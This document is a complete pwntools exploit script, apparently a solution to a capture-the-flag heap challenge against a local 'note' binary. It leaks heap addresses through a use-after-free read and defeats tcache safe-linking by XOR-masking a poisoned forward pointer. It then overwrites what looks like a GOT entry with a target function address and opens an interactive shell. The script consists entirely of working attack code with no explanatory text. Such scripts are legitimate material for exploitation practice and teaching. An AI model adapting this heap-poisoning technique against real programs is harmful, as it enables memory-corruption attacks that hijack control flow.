
#!/usr/bin/env python3

from pwn import *

p = process('./deploy/note')

def create(id, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(id).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', str(data).encode())

def update(id, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(id).encode())
    p.sendafter(b'data: ', str(data).encode())

def delete(id):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(id).encode())

def update_int(id, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(id).encode())
    p.sendafter(b'data: ', data)

def read(id):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(id).encode())
    p.recvuntil(b'data: ')

def create_int(id, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(id).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def main():
    create(0, 0x70, "a")

    for i in range(1, 8):
        create(i, 0x60, "a")
        delete(i)

    create(8, 0x60, "a")
    delete(8)
    read(8)

    leak = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    print(f"leak_fd = {hex(leak)}")

    create(8, 0x60, "a")
    create(9, 0x60, "a")
    delete(8)
    delete(9)
    read(9)

    leak2 = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
    print(f"leak_fd2 = {hex(leak2)}")
    print(f"header_chunk = {hex(leak2 ^ leak)}")

    heap_ar = (leak2 ^ leak) + 0x90

    update_int(9, p64((heap_ar >> 12) ^ 0x4040a0))

    create(8, 0x60, "a")
    create_int(9, 0x60, b'a' * 8 + p64(0x70) + p64(0x404018))

    update_int(1, p64(0x401256))
    delete(1)

    p.interactive()

if __name__ == "__main__":
    main()
